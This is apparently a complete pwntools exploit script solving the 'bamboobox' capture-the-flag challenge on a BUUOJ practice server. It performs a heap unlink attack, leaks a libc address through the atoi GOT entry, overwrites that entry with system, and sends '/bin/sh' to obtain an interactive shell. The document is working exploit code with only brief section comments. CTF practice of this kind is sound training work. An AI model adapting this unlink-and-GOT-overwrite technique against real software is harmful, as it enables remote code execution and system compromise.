#! /usr/bin/python

import sys
from pwn import *
from LibcSearcher import *

sl = lambda x:p.sendline(x)
sda = lambda x,y:p.sendafter(x,y)
sla = lambda x,y:p.sendlineafter(x,y)
rv = lambda x:p.recv(x)
ru = lambda x:p.recvuntil(x)
ia = lambda :p.interactive()
context.log_level = 'debug'

if(sys.argv[1] == 'l'):
	p = process("./bamboobox")
	elf = ELF("./bamboobox")
else:
	p = remote("node3.buuoj.cn",28435)
	elf = ELF("./bamboobox")

def menu(choice):
	ru(":")
	sl(str(choice))


def show():
	menu(1)

def add(size,content):
	menu(2)
	ru(":")
	sl(str(size))
	ru(":")
	sl(content)

def change(idx,size,content):
	menu(3)
	ru("of item:")
	sl(str(idx))
	ru("item name:")
	sl(str(size))
	ru("the item:")
	sl(content)

def remove(idx):
	menu(4)
	sla("Please enter the index of item:",str(idx))

puts_plt = elf.got['puts']
atoi_got = elf.got["atoi"]
ptr = 0x6020C8
fake_FD = ptr - 0x18
fake_BK = ptr - 0x10

###unlink###
add(0x80,'aaaa')#0
add(0x80,'bbbb')#1
add(0x80,'cccc')#2

payload = p64(0) + p64(0x81) + p64(fake_FD) + p64(fake_BK)
payload = payload.ljust(0x80,'A')
payload+= p64(0x80) + p64(0x90)

change(0,0x90,payload)
remove(1)
#gdb.attach(p)

###leak libc###
payload = p64(0) + p64(0) + p64(0x80) + p64(atoi_got)
change(0,len(payload),payload)
show()

ru(": ")
atoi = u64(ru("\x7f")[-6:].ljust(8,'\x00'))
libc = LibcSearcher('atoi',atoi)
libc_base = atoi - libc.dump('atoi')
system = libc_base + libc.dump('system')

###modify GOT###
change(0,0x8,p64(system))

###get shell###
sl("/bin/sh\x00")
ia()
